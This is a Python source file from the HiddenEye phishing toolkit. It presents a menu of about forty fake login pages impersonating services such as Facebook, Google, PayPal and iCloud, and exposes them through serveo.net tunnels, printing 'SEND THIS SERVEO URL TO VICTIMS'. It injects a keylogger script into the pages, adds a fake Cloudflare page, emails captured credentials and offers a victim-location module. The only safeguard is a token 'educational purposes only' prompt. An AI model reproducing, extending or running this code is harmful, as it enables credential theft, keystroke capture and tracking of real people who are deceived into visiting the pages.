# Any actions must be here

import getpass
import base64
from os import system, path
from distutils.dir_util import copy_tree
from time import sleep
import re
import json
from urllib.request import urlopen
from subprocess import check_output, CalledProcessError
from sys import stdout, argv, exit
from Defs.ThemesManager import colorSelector
from Defs.Configurations import readConfig, ifSettingsNotExists
from Defs.Languages import *


installGetText()
languageSelector()
ifSettingsNotExists()
config = readConfig()


colorTheme = colorSelector()
MAIN0, MAIN1, MAIN2, MAIN3, MAIN4 = colorTheme[0], colorTheme[
    1], colorTheme[2], colorTheme[3],  colorTheme[4]




def selectPort():  # Question where user must select port
    system('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
    choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
    try:
        if (int(choice) > 65535 or int(choice) < 1):
            return selectPort()
        else:
            return choice
    except:
        return selectPort()





			














def customServeo(port):

    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for serveo'''.format(MAIN0, MAIN2))
    lnk = input("\n{0}CUSTOM Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
    if not ".serveo.net" in lnk:
        lnk += ".serveo.net"
    else:
        pass
    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link.url 2> /dev/null &' % (lnk, port))
    sleep(7)
    try:
        output = check_output(
            "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
        url = output.decode("utf-8")
        system('clear')
        print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(
            MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
        print("\n")

    except CalledProcessError:
        print('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
'''.format(MAIN0, MAIN4))
        sleep(4)
        system('clear')
        return customServeo(port)


def randomServeo(port):
    system('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
    sleep(8)
    try:
        output = check_output(
            "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
        url = output.decode("utf-8")
        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(
            MAIN0, MAIN4, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
        print("\n")
    except CalledProcessError:

        sleep(4)
        system('clear')
        return randomServeo(port)



def runMainMenu():  # menu where user select what they wanna use
    # Terms Of Service
    sleep(6)
    system('clear')
    orange  = '\033[33m'
    blue  = '\033[34m'
    purple  = '\033[35m'
    red  = '\033[31m'
    print("\n\n\n              {2}WITH GREAT {1}POWER {3}- {2}COMES GREAT {1}RESPONSIBILITY      ".format(orange, red, purple, blue))
    
    if input("\n\n\n\n{2}[{1}!{2}]{3} Do you agree to use this tool for educational/testing purposes only? {1}({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0, orange)).upper() != 'Y':
        system('clear')
        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(MAIN0, MAIN4))
        exit()


def mainMenu():
    system('clear')
    with open('version.txt') as f:
        ver_current = f.read()
        version = ver_current.strip()
    print('''

 {2} ██   ██ ██ ██████   ██████   ███████ ███   ██  {3}███████ ██    ██ ███████ {1}
 {2} ██   ██ ██ ██    ██ ██    ██ ██      ████  ██  {3}██       ██  ██  ██      {1}
 {2} ███████ ██ ██    ██ ██    ██ ███████ ██ ██ ██  {3}███████   ████   ███████ {1}
 {2} ██   ██ ██ ██    ██ ██    ██ ██      ██  ████  {3}██         ██    ██      {1}
 {2} ██   ██ ██ ██████   ██████   ███████ ██   ███  {3}███████    ██    ███████ {1}
                                                      {3}[{1}v {4}{3}]{1} BY:DARKSEC{2}
             {3}[{2} Modern Phishing Tool With Advanced Functionality {3}]
{3}[{2} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {3}]
________________________________________________________________________________'''.format(MAIN3, MAIN4, MAIN2, MAIN0, version))
    print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------".format(MAIN0, MAIN2))
    print("\n{0}PHISHING-MODULES:".format(MAIN0, MAIN2))
    print(" {0}[{1}01{0}]{1} Facebook       {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(MAIN0, MAIN2))
    print(" {0}[{1}02{0}]{1} Google         {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
        MAIN0, MAIN2))
    print(" {0}[{1}03{0}]{1} LinkedIn       {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt       {0}[{1}39{0}]{1} CUSTOM(1)".format(
        MAIN0, MAIN2))
    print(" {0}[{1}04{0}]{1} GitHub         {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox         {0}[{1}40{0}]{1} CUSTOM(2)".format(
        MAIN0, MAIN2))
    print(" {0}[{1}05{0}]{1} StackOverflow  {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}06{0}]{1} WordPress      {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}07{0}]{1} Twitter        {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}08{0}]{1} Instagram      {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify".format(
        MAIN0, MAIN2))
    print(" {0}[{1}09{0}]{1} Snapchat       {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}10{0}]{1} Yahoo          {0}[{1}22{0}]{1} Quora          {0}[{1}34{0}]{1} Yandex ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}11{0}]{1} Twitch         {0}[{1}23{0}]{1} PornHub        {0}[{1}35{0}]{1} Reddit ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ".format(
        MAIN0, MAIN2))
    print("\n{0}SOCIAL-ENGINEERING-TOOLS:".format(MAIN0, MAIN2))
    print(" {0}[{1}A{0}]{1} Get Victim Location".format(MAIN0, MAIN2))

    option = input("\n{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
    if option == '1' or option == '01':
        loadModule('Facebook')
        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
        runPhishing('Facebook', customOption)
    elif option == '2' or option == '02':
        loadModule('Google')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
        runPhishing('Google', customOption)
    elif option == '3' or option == '03':
        loadModule('LinkedIn')
        customOption = ''
        runPhishing('LinkedIn', customOption)
    elif option == '4' or option == '04':
        loadModule('GitHub')
        customOption = ''
        runPhishing('GitHub', customOption)
    elif option == '5' or option == '05':
        loadModule('StackOverflow')
        customOption = ''
        runPhishing('StackOverflow', customOption)
    elif option == '6' or option == '06':
        loadModule('WordPress')
        customOption = ''
        runPhishing('WordPress', customOption)
    elif option == '7' or option == '07':
        loadModule('Twitter')
        customOption = ''
        runPhishing('Twitter', customOption)
    elif option == '8' or option == '08':
        loadModule('Instagram')
        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
        runPhishing('Instagram', customOption)
    elif option == '9' or option == '09':
        loadModule('Snapchat')
        customOption = ''
        runPhishing('Snapchat', customOption)
    elif option == '10':
        loadModule('Yahoo')
        customOption = ''
        runPhishing('Yahoo', customOption)
    elif option == '11':
        loadModule('Twitch')
        customOption = ''
        runPhishing('Twitch', customOption)
    elif option == '12':
        loadModule('Microsoft')
        customOption = ''
        runPhishing('Microsoft', customOption)
    elif option == '13':
        loadModule('Steam')
        customOption = ''
        runPhishing('Steam', customOption)
    elif option == '14':
        loadModule('VK')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
        runPhishing('VK', customOption)
    elif option == '15':
        loadModule('iCloud')
        customOption = ''
        runPhishing('iCloud', customOption)
    elif option == '16':
        loadModule('GitLab')
        customOption = ''
        runPhishing('GitLab', customOption)
    elif option == '17':
        loadModule('NetFlix')
        customOption = ''
        runPhishing('NetFlix', customOption)
    elif option == '18':
        loadModule('Origin')
        customOption = ''
        runPhishing('Origin', customOption)
    elif option == '19':
        loadModule('Pinterest')
        customOption = ''
        runPhishing('Pinterest', customOption)
    elif option == '20':
        loadModule('ProtonMail')
        customOption = ''
        runPhishing('ProtonMail', customOption)
    elif option == '21':
        loadModule('Spotify')
        customOption = ''
        runPhishing('Spotify', customOption)
    elif option == '22':
        loadModule('Quora')
        customOption = ''
        runPhishing('Quora', customOption)
    elif option == '23':
        loadModule('PornHub')
        customOption = ''
        runPhishing('PornHub', customOption)
    elif option == '24':
        loadModule('Adobe')
        customOption = ''
        runPhishing('Adobe', customOption)
    elif option == '25':
        loadModule('Badoo')
        customOption = ''
        runPhishing('Badoo', customOption)
    elif option == '26':
        loadModule('CryptoCurrency')
        customOption = ''
        runPhishing('CryptoCurrency', customOption)
    elif option == '27':
        loadModule('DevianArt')
        customOption = ''
        runPhishing('DevianArt', customOption)
    elif option == '28':
        loadModule('DropBox')
        customOption = ''
        runPhishing('DropBox', customOption)
    elif option == '29':
        loadModule('eBay')
        customOption = ''
        runPhishing('eBay', customOption)
    elif option == '30':
        loadModule('MySpace')
        customOption = ''
        runPhishing('Myspace', customOption)
    elif option == '31':
        loadModule('PayPal')
        customOption = ''
        runPhishing('PayPal', customOption)
    elif option == '32':
        loadModule('Shopify')
        customOption = ''
        runPhishing('Shopify', customOption)
    elif option == '33':
        loadModule('Verizon')
        customOption = ''
        runPhishing('Verizon', customOption)
    elif option == '34':
        loadModule('Yandex')
        customOption = ''
        runPhishing('Yandex', customOption)
    elif option == '35':
        loadModule('Reddit')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
        runPhishing('Reddit', customOption)
    elif option == '36':
        loadModule('Subitoit')
        customOption = ''
        runPhishing('Subitoit', customOption)
    elif option == '37':
        loadModule('PlayStation')
        customOption = ''
        runPhishing('PlayStation', customOption)
    elif option == '38':
        loadModule('Xbox')
        customOption = ''
        runPhishing('Xbox', customOption)
    elif option == '39':
        loadModule('CUSTOM(1)')
        customOption = ''
        runPhishing('CUSTOM(1)', customOption)
    elif option == '40':
        loadModule('CUSTOM(2)')
        customOption = ''
        runPhishing('CUSTOM(2)', customOption)
    
    #Below Are Tools And Above Are Phishing Modules..

    elif option == 'A' or option == 'a':
        loadModule('LOCATION')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} NEAR YOU (Webpage Looks Like Legitimate)\n {0}[{1}2{0}]{1} GDRIVE (Asks For Location Permission To redirect GDRIVE) \n\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
        runPhishing('LOCATION', customOption)

    else:
        endMessage(port)


def loadModule(module):  # This one just show text..
    print('''\n {0}
 [{1}*{0}] SELECT ANY ONE MODE...{0}\n--------------------------------'''.format(MAIN0, MAIN2))


def inputCustom():  # Question where user can input custom web-link
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    print(
        '''\n{1}**{0}(Do not leave it blank. Unless Errors may occur)'''.format(MAIN2, MAIN4))
    print(
        '''\n{0}[{1}*{0}]{0}Insert a custom redirect url:'''.format(MAIN0, MAIN4))
    custom = input('''\n{0}REDIRECT HERE>>> {2}'''.format(MAIN0, MAIN4, MAIN2))
    if 'http://' in custom or 'https://' in custom:
        pass
    else:
        custom = 'http://' + custom

    if path.exists('Server/www/js/location.js'): # For Location (gdrive) Template Redirection. 
        with open('Server/www/js/location.js') as f: 
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/js/location.js', 'w')
        f.write(c)
        f.close()

    if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
        with open('Server/www/login.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/login.php', 'w')
        f.write(c)
        f.close()

        with open('Server/www/post.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/post.php', 'w')
        f.write(c)
        f.close()

    else:
        with open('Server/www/login.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/login.php', 'w')
        f.write(c)
        f.close()


def emailPrompt():
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ PROMPT: NEED CAPTURED DATA TO EMAIL ? ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
    addingEmail()


def addingEmail():
    print("\n{0}[{1}!{0}]{1}No Need To Configure, If you have Already Done. ".format(
        MAIN0, MAIN4))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT CAPTURED DATA TO BE EMAILED, THEN CREATE CONFIG FILE -{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        print("\n{0}[{1}!{0}] BEFORE STARTING MAKE SURE THESE THINGS: \n\n{0}[{1}+{0}] {1}YOU HAVE CORRECT GMAIL USERNAME & PASSWORD\n{0}[{1}+{0}] {1}YOU HAVE DISABLED 2-FACTOR AUTHENTICATION FROM YOUR GMAIL ACCOUNT\n{0}[{1}+{0}] {1}YOU HAVE TURNED ON LESS SECURED APPS \n    (https://myaccount.google.com/lesssecureapps) \n\n".format(MAIN0, MAIN4))
        input('[.] Press Enter To Start Configuring Gmail Credential File...')
        emailPrompt2()
    elif choice == 'N':
        pass
    else:
        print('[^] ERROR: Please choose correct option to continue...')
        sleep(1)
        emailPrompt()


def emailPrompt2():
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ PROMPT: CONFIG EMAIL CREDENTIAL FILE ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
    emailConfig()


def emailConfig():
    system('cp Defs/Send_Email/EmailConfigDefault.py Defs/Send_Email/emailconfig.py')
    GMAILACCOUNT = input(
        "{0}[{1}+{0}]{0} Enter Your Gmail Username:{1} ".format(MAIN0, MAIN4))
    with open('Defs/Send_Email/emailconfig.py') as f:
        read_data = f.read()
        c = read_data.replace('GMAILACCOUNT', GMAILACCOUNT)
        f = open('Defs/Send_Email/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Email Address Added To config File. !\n".format(
            MAIN0, MAIN4))

    GMAILPASSWORD = getpass.getpass(
        "{0}[{1}+{0}]{0} Enter Your Gmail Password:{1} ".format(MAIN0, MAIN4))
    with open('Defs/Send_Email/emailconfig.py') as f:
        read_data = f.read()
        GMAILPASSWORD = base64.b64encode(GMAILPASSWORD.encode())
        GMAILPASSWORD = (GMAILPASSWORD.decode('utf-8'))
        c = read_data.replace('GMAILPASSWORD', GMAILPASSWORD)
        f = open('Defs/Send_Email/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Password(Encoded) Added To config File. !\n".format(
            MAIN0, MAIN4))
    RECIPIENTEMAIL = input(
        "{0}[{1}+{0}]{0} Enter Recipient Email:{1} ".format(MAIN0, MAIN4))
    with open('Defs/Send_Email/emailconfig.py') as f:
        read_data = f.read()
        c = read_data.replace('RECIPIENTEMAIL', RECIPIENTEMAIL)
        f = open('Defs/Send_Email/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Recipient Email Address Added To config File. !\n".format(
            MAIN0, MAIN4))
        print(
            '\n\n{0}[{1}SUCCESS{0}]{0}: Created Config File & Saved To (Defs/Send_Email/Config.py)'.format(MAIN0, MAIN4))


def cloudflarePrompt():

    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
    addingCloudfare()


def addingCloudfare():
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        addCloudfare()
    else:
        sleep(1)


def addCloudfare():
    system('mv Server/www/index.* Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
    print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(MAIN0, MAIN4))
    sleep(1)


def keyloggerprompt():
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))


def addingkeylogger():
    print("\n{0}[{1}!{0}]{1}ATTENTION: Adding Keylogger Mostly Kills the Tunnel Connection.\n".format(
        MAIN0, MAIN4))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        addkeylogger()
    else:
        sleep(1)


def addkeylogger():
    if path.exists('Server/www/index.html'):
        with open('Server/www/index.html') as f:
            read_data = f.read()
        c = read_data.replace(
            '</title>', '</title><script src="keylogger.js"></script>')
        f = open('Server/www/index.html', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(MAIN0, MAIN4))
        sleep(2)
    else:
        with open('Server/www/index.php') as f:
            read_data = f.read()
        c = read_data.replace(
            '</title>', '</title><script src="keylogger.js"></script>')
        f = open('Server/www/index.php', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(MAIN0, MAIN4))
        sleep(2)


def runServer(port):
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))



def returnServer(port):
	selectServer(port)




